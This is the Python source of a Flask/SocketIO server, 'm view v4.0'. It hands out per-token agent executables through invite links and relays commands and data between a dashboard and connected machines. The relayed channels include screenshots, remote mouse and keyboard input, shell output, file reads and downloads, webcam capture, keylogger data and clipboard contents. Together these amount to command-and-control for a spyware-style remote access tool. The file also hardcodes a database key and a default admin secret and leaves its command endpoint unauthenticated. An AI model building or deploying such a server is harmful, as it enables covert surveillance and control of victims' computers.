"""
m view — Relay + Distribution Server  v4.0
Fixes: token regex case-insensitive, Supabase optional/offline-safe,
       correct column names, SocketIO relay, hardcoded credentials.
pip install flask flask-cors flask-socketio supabase python-dotenv
py -3.12 server.py
"""
import os, re, logging, datetime
from pathlib import Path
from functools import wraps

try:
    from dotenv import load_dotenv; load_dotenv()
except ImportError:
    pass

from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS

try:
    from flask_socketio import SocketIO, emit, join_room
    SOCKETIO_OK = True
except ImportError:
    SOCKETIO_OK = False
    print("[WARN] pip install flask-socketio")

# ── Credentials ──────────────────────────────────────────────
SUPABASE_URL = os.environ.get("SUPABASE_URL")  or "https://iacdzpcoftxxcoigopun.supabase.co"
SUPABASE_KEY = os.environ.get("SUPABASE_KEY")  or "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlhY2R6cGNvZnR4eGNvaWdvcHVuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY0MjA1NTUsImV4cCI6MjA5MTk5NjU1NX0.5Eo21XrLTWL3RyKmuvJPdaS-NssraDMyAxVMFy-F054"
AGENT_DIR    = os.environ.get("AGENT_DIR",   "bin")
AGENT_FILE   = os.environ.get("AGENT_FILE",  "master_agent.exe")
ADMIN_KEY    = os.environ.get("ADMIN_KEY",   "mview-admin-secret")
PORT         = int(os.environ.get("PORT",     5000))
TABLE        = os.environ.get("SB_TABLE",    "devices")

# FIX: case-insensitive [A-Fa-f] matches JS crypto.getRandomValues uppercase output
TOKEN_RE = re.compile(r"^MV-[0-9A-Fa-f]{6}-[0-9A-Fa-f]{6}-[0-9A-Fa-f]{6}$")

logging.basicConfig(level=logging.INFO, format="%(asctime)s  %(levelname)-8s  %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
log = logging.getLogger("mview")

app = Flask(__name__, static_folder=".", static_url_path="")
CORS(app, resources={r"/*": {"origins": "*"}})

sio = SocketIO(app, cors_allowed_origins="*", async_mode="threading", logger=False, engineio_logger=False) if SOCKETIO_OK else None

_devices = {}
_sb = None

def get_sb():
    global _sb
    if _sb: return _sb
    try:
        from supabase import create_client
        _sb = create_client(SUPABASE_URL, SUPABASE_KEY)
        log.info("Supabase connected.")
        return _sb
    except Exception as e:
        log.warning(f"Supabase offline: {e}")
        return None

def db_get(token):
    sb = get_sb()
    if not sb: return {"device_id": token, "status": "pending", "expires_at": None}
    try:
        r = sb.table(TABLE).select("*").eq("device_id", token).execute()
        rows = r.data or []
        return rows[0] if rows else None
    except Exception as e:
        log.error(f"db_get: {e}")
        return {"device_id": token, "status": "pending", "expires_at": None}

def db_update(token, upd):
    sb = get_sb()
    if not sb: return False
    try: sb.table(TABLE).update(upd).eq("device_id", token).execute(); return True
    except Exception as e: log.error(f"db_update: {e}"); return False

def db_insert(payload):
    sb = get_sb()
    if not sb: return payload
    try:
        r = sb.table(TABLE).insert(payload).execute()
        return (r.data or [payload])[0]
    except Exception as e: log.error(f"db_insert: {e}"); return payload

def utcnow(): return datetime.datetime.utcnow().isoformat()

def is_expired(s):
    exp = s.get("expires_at")
    if not exp: return False
    try:
        dt = datetime.datetime.fromisoformat(exp.replace("Z","+00:00"))
        return datetime.datetime.now(datetime.timezone.utc) > dt
    except: return False

def valid_token(t): return bool(TOKEN_RE.match(t or ""))

def require_admin(f):
    @wraps(f)
    def w(*a, **k):
        if request.headers.get("X-Admin-Key","") != ADMIN_KEY:
            return jsonify({"error":"Unauthorised"}), 401
        return f(*a, **k)
    return w

@app.route("/")
def root():
    return send_from_directory(".", "index.html")

@app.route("/dashboard")
@app.route("/dashboard.html")
def dashboard():
    return send_from_directory(".", "dashboard.html")

@app.route("/index.html")
def index_html():
    return send_from_directory(".", "index.html")

@app.route("/status")
@app.route("/health")
@app.route("/api/server-info")
def health():
    return jsonify({"status":"ok","agent_file":(Path(AGENT_DIR)/AGENT_FILE).is_file(),"database":get_sb() is not None,"devices_online":len(_devices),"server_time":utcnow(),"version":"4.0.0"})

@app.route("/invite/<token>")
@app.route("/onboard/<token>")
def serve_agent(token):
    from flask import Response
    log.info(f"Invite: token={token} ip={request.remote_addr}")
    if not valid_token(token):
        return jsonify({"error":"Invalid token format."}), 400
    ap = Path(AGENT_DIR)/AGENT_FILE
    if not ap.is_file():
        return jsonify({"error":"Agent not ready.","hint":f"Build master_agent.exe → {Path(AGENT_DIR).resolve()}"}), 503
    session = db_get(token)
    if session is None: return jsonify({"error":"Invite link not found."}), 404
    if session.get("status") in ("revoked","expired","rejected"): return jsonify({"error":"Link no longer valid."}), 410
    if is_expired(session): db_update(token,{"status":"expired"}); return jsonify({"error":"Link expired."}), 410
    db_update(token,{"status":"downloading","download_ip":request.remote_addr,"downloaded_at":utcnow(),"user_agent":request.headers.get("User-Agent","")[:200]})
    log.info(f"Serving mview_agent_{token}.exe to {request.remote_addr}")

    # ── Trailer-append approach ────────────────────────────────────
    # PyInstaller compresses all Python string constants into a .pyc blob,
    # so byte-patching a placeholder string NEVER works — it's not in the
    # raw exe bytes. Instead we append a fixed-size trailer AFTER the exe.
    #
    # Trailer layout (64 bytes total):
    #   [0:4]   magic  = b"MVTK"          (4 bytes — sanity check)
    #   [4:60]  token  = utf-8, null-padded to 56 bytes
    #   [60:64] magic2 = b"MVED"          (4 bytes — end sentinel)
    #
    # The agent reads the last 64 bytes of sys.executable at startup.
    # This works regardless of PyInstaller compression.
    TRAILER_SIZE  = 64
    MAGIC_HEAD    = b"MVTK"
    MAGIC_TAIL    = b"MVED"
    TOKEN_FIELD   = 56   # bytes reserved for token

    try:
        raw       = ap.read_bytes()
        tok_bytes = token.encode("utf-8")
        if len(tok_bytes) > TOKEN_FIELD:
            tok_bytes = tok_bytes[:TOKEN_FIELD]
        padded    = tok_bytes.ljust(TOKEN_FIELD, b"\x00")
        trailer   = MAGIC_HEAD + padded + MAGIC_TAIL   # exactly 64 bytes

        patched   = raw + trailer
        log.info(f"Trailer appended for token={token}  total_size={len(patched):,} bytes")

        return Response(
            patched,
            mimetype="application/octet-stream",
            headers={"Content-Disposition": f'attachment; filename="mview_agent_{token}.exe"'}
        )
    except Exception as e:
        log.error(f"Trailer append failed: {e}")
        return jsonify({"error": "Agent build error — contact admin."}), 500

@app.route("/api/invite", methods=["GET","POST"])
@app.route("/api/generate", methods=["GET","POST"])
@app.route("/invite/generate", methods=["GET","POST"])
@app.route("/generate_invite", methods=["GET","POST"])
def generate_invite():
    data = request.get_json(silent=True) or request.form.to_dict() or {}
    import secrets
    def hex6(): return secrets.token_hex(3).upper()
    token = f"MV-{hex6()}-{hex6()}-{hex6()}"
    label = data.get("label") or data.get("name") or token
    loc   = data.get("location","")
    dtype = data.get("device_type","Standard Display")
    expiry_secs = int(data.get("expiry", 86400))
    expires_at = None
    if expiry_secs > 0:
        expires_at = (datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(seconds=expiry_secs)).isoformat()
    payload = {"device_id":token,"label":label,"location":loc,"device_type":dtype,"status":"pending","expires_at":expires_at,"created_at":utcnow()}
    db_insert(payload)
    log.info(f"Invite generated: {token} label={label}")
    srv = request.host_url.rstrip("/")
    return jsonify({"status":"ok","token":token,"device_id":token,"label":label,"download_url":f"{srv}/invite/{token}","agent_url":f"{srv}/invite/{token}","expires_at":expires_at}), 201


    data = request.get_json(silent=True) or {}
    token = data.get("device_id","").strip()
    if not valid_token(token): return jsonify({"error":"Invalid token"}), 400
    # Only columns that actually exist in the schema
    payload = {"device_id":token,"label":data.get("label"),"location":data.get("location"),"device_type":data.get("device_type","Standard Display"),"status":"pending","expires_at":data.get("expires_at"),"created_at":utcnow()}
    return jsonify({"status":"created","session":db_insert(payload)}), 201

@app.route("/api/session/<token>")
def get_session(token):
    if not valid_token(token): return jsonify({"error":"Invalid token"}), 400
    s = db_get(token)
    return (jsonify(s), 200) if s else (jsonify({"error":"Not found"}), 404)

@app.route("/agent/checkin", methods=["POST"])
def agent_checkin():
    data = request.get_json(silent=True) or {}
    token = data.get("device_id","").strip()
    if not valid_token(token): return jsonify({"error":"Invalid device_id"}), 400
    session = db_get(token)
    if not session: return jsonify({"error":"Session not found"}), 404
    if session.get("status")=="revoked": return jsonify({"error":"Session revoked"}), 403
    db_update(token,{"status":"connected","ip_address":request.remote_addr,"hostname":data.get("hostname"),"os_info":data.get("os_info"),"agent_version":data.get("agent_version"),"connected_at":utcnow()})
    if sio and token in _devices:
        sio.emit("device_online",{"device_id":token,"label":_devices[token].get("label",token),"ip":request.remote_addr})
    log.info(f"Agent check-in: {token} ip={request.remote_addr}")
    return jsonify({"status":"accepted","server_time":utcnow()}), 200

@app.route("/api/sessions")
@require_admin
def list_sessions():
    sb = get_sb()
    if not sb: return jsonify({"sessions":[],"note":"DB offline"}), 200
    try:
        r = sb.table(TABLE).select("*").order("created_at",desc=True).execute()
        return jsonify({"sessions":r.data or[],"count":len(r.data or[])})
    except Exception as e: return jsonify({"error":str(e)}), 500

@app.route("/api/session/<token>", methods=["DELETE"])
@require_admin
def revoke_session(token):
    if not valid_token(token): return jsonify({"error":"Invalid token"}), 400
    db_update(token,{"status":"revoked","revoked_at":utcnow()})
    return jsonify({"status":"revoked","device_id":token})

@app.route("/api/devices")
def api_devices():
    return jsonify({"devices":list(_devices.values()),"count":len(_devices)})

@app.route("/api/command", methods=["POST"])
def send_command():
    data = request.get_json(silent=True) or {}
    did = data.get("device_id","")
    if not sio: return jsonify({"error":"SocketIO not installed"}), 503
    if did not in _devices: return jsonify({"error":"Device not connected"}), 404
    sio.emit("request_action", data, to=_devices[did]["sid"])
    return jsonify({"status":"sent","tab":data.get("tab")})

@app.errorhandler(404)
def e404(e): return jsonify({"error":"Not found"}), 404
@app.errorhandler(500)
def e500(e): log.exception("500"); return jsonify({"error":"Internal error"}), 500

if SOCKETIO_OK and sio:
    @sio.on("connect")
    def on_connect(): log.info(f"WS connect sid={request.sid}")

    @sio.on("disconnect")
    def on_disconnect():
        gone=[did for did,d in _devices.items() if d.get("sid")==request.sid]
        for did in gone:
            label=_devices[did].get("label",did); del _devices[did]
            log.info(f"Device offline: {label}")
            db_update(did,{"status":"offline","disconnected_at":utcnow()})
            sio.emit("agent_offline",{"device_id":did,"name":label,"label":label,"ts":utcnow()})
            sio.emit("device_offline",{"device_id":did,"label":label,"ts":utcnow()})

    @sio.on("agent_connect")
    def on_agent_connect(data):
        did=data.get("device_id") or data.get("token","")
        label=data.get("label") or data.get("hostname") or did
        join_room(did)
        _devices[did]={"sid":request.sid,"device_id":did,"label":label,"status":"online","hostname":data.get("hostname"),"username":data.get("username"),"os":data.get("os"),"local_ip":data.get("local_ip"),"cpu_count":data.get("cpu_count"),"ram_total_gb":data.get("ram_total_gb"),"agent_version":data.get("agent_version"),"connected_at":utcnow(),"cpu":None,"ram":None}
        log.info(f"Agent ONLINE: {label} ({did})")
        # Write "online" — dashboard statusFrom() accepts: connected|online|active|live|running
        db_update(did,{"status":"online","ip_address":data.get("local_ip"),"hostname":data.get("hostname"),"os_info":data.get("os"),"agent_version":data.get("agent_version"),"connected_at":utcnow()})
        # Emit agent_online — dashboard listens for d.name and d.device_id
        sio.emit("agent_online",{"device_id":did,"name":label,"label":label,"ip":data.get("local_ip"),"fingerprint":data})
        sio.emit("device_online",{"device_id":did,"label":label,"fingerprint":data})

    @sio.on("heartbeat")
    def on_hb(data):
        did=data.get("device_id")
        if did in _devices:
            _devices[did].update({"cpu":data.get("cpu"),"ram":data.get("ram"),"last_beat":utcnow()})
        # Only emit to dashboard clients (skip the agent sid that sent this)
        sio.emit("heartbeat_update", data, skip_sid=request.sid)

    @sio.on("dashboard_command")
    def on_cmd(data):
        did=data.get("device_id")
        if did not in _devices: emit("command_error",{"error":f"Device '{did}' not connected."}); return
        sio.emit("request_action",data,to=_devices[did]["sid"])
        log.info(f"Command → {did}: tab={data.get('tab')}")

    # ── Dashboard → Agent: on-demand screenshot request ──────────
    @sio.on("request_screenshot")
    def on_request_screenshot(data):
        did = data.get("device_id","")
        if did in _devices:
            sio.emit("request_action", {
                "tab":     "screenshot",
                "quality": data.get("quality", 60),
                "scale":   data.get("scale", 0.75),
                "device_id": did,
            }, to=_devices[did]["sid"])

    # ── Dashboard → Agent: mouse events ──────────────────────────
    @sio.on("mouse_event")
    def on_mouse(data):
        did = data.get("device_id","")
        if did in _devices:
            sio.emit("request_action", {"tab": "mouse_event", **data}, to=_devices[did]["sid"])

    # ── Dashboard → Agent: scroll events ─────────────────────────
    @sio.on("scroll_event")
    def on_scroll(data):
        did = data.get("device_id","")
        if did in _devices:
            sio.emit("request_action", {"tab": "scroll_event", **data}, to=_devices[did]["sid"])

    # ── Dashboard → Agent: keyboard events ───────────────────────
    @sio.on("key_event")
    def on_key(data):
        did = data.get("device_id","")
        if did in _devices:
            sio.emit("request_action", {"tab": "key_event", **data}, to=_devices[did]["sid"])

    # ── Dashboard → Agent: ping for latency ──────────────────────
    @sio.on("ping_agent")
    def on_ping(data):
        did = data.get("device_id","")
        if did in _devices:
            sio.emit("request_action", {"tab": "ping", **data}, to=_devices[did]["sid"])

    # ── Dashboard → Agent: disconnect screen ─────────────────────
    @sio.on("disconnect_screen")
    def on_disconnect_screen(data):
        did = data.get("device_id","")
        if did in _devices:
            sio.emit("request_action", {"tab": "monitor", "action": "stop", "device_id": did}, to=_devices[did]["sid"])

    # ── Agent → Dashboard: frame relay ───────────────────────────
    @sio.on("screen_data")
    def on_screen_data(data):
        out = dict(data)
        if "image" in out and "frame" not in out:
            out["frame"] = out.pop("image")
        # skip_sid = don't echo back to the agent that sent this
        sio.emit("screenshot", out, skip_sid=request.sid)

    @sio.on("screenshot_result")
    def on_screenshot_result(data):
        out = dict(data)
        if "image" in out and "frame" not in out:
            out["frame"] = out.pop("image")
        sio.emit("screenshot", out, skip_sid=request.sid)

    # ── Agent → Dashboard: pong relay ────────────────────────────
    @sio.on("ping_result")
    def on_ping_result(data):
        sio.emit("pong_agent", data, skip_sid=request.sid)

    # ── Generic agent→dashboard relays ───────────────────────────
    # Each handler defined separately to avoid Python closure-in-loop bug
    @sio.on("system_stats_report")
    def _r_system(data): sio.emit("update_system_tab", data, skip_sid=request.sid)

    @sio.on("processes_report")
    def _r_procs(data): sio.emit("processes_result", data, skip_sid=request.sid)

    @sio.on("kill_result")
    def _r_kill(data): sio.emit("kill_result", data, skip_sid=request.sid)

    @sio.on("shell_result")
    def _r_shell(data): sio.emit("shell_result", data, skip_sid=request.sid)

    @sio.on("file_list_result")
    def _r_flist(data): sio.emit("file_list_result", data, skip_sid=request.sid)

    @sio.on("file_read_result")
    def _r_fread(data): sio.emit("file_read_result", data, skip_sid=request.sid)

    @sio.on("file_download_result")
    def _r_fdl(data): sio.emit("file_download_result", data, skip_sid=request.sid)

    @sio.on("drives_report")
    def _r_drives(data): sio.emit("drives_report", data, skip_sid=request.sid)

    @sio.on("disks_report")
    def _r_disks(data): sio.emit("disks_report", data, skip_sid=request.sid)

    @sio.on("network_report")
    def _r_net(data): sio.emit("network_report", data, skip_sid=request.sid)

    @sio.on("webcam_result")
    def _r_webcam(data): sio.emit("webcam_result", data, skip_sid=request.sid)

    @sio.on("keylog_data")
    def _r_keylog(data): sio.emit("keylog_data", data, skip_sid=request.sid)

    @sio.on("clipboard_data")
    def _r_clip(data): sio.emit("clipboard_data", data, skip_sid=request.sid)

    @sio.on("action_result")
    def _r_action(data): sio.emit("action_result", data, skip_sid=request.sid)

def startup():
    log.info("="*58); log.info("  m view Server  v4.0"); log.info("="*58)
    a=Path(AGENT_DIR)/AGENT_FILE
    log.info(f"  {'✓' if a.is_file() else '✗'} Agent: {a}  ({a.stat().st_size:,} bytes)" if a.is_file() else f"  ✗ Agent NOT found: {a.resolve()}")
    log.info(f"  ✓ Supabase: {SUPABASE_URL[:50]}")
    log.info(f"  ✓ SocketIO: {'yes' if SOCKETIO_OK else 'NO — pip install flask-socketio'}")
    log.info(f"  → http://0.0.0.0:{PORT}"); log.info("="*58)

if __name__=="__main__":
    startup()
    if SOCKETIO_OK and sio: sio.run(app,host="0.0.0.0",port=PORT,debug=False,allow_unsafe_werkzeug=True)
    else: app.run(host="0.0.0.0",port=PORT,debug=False)
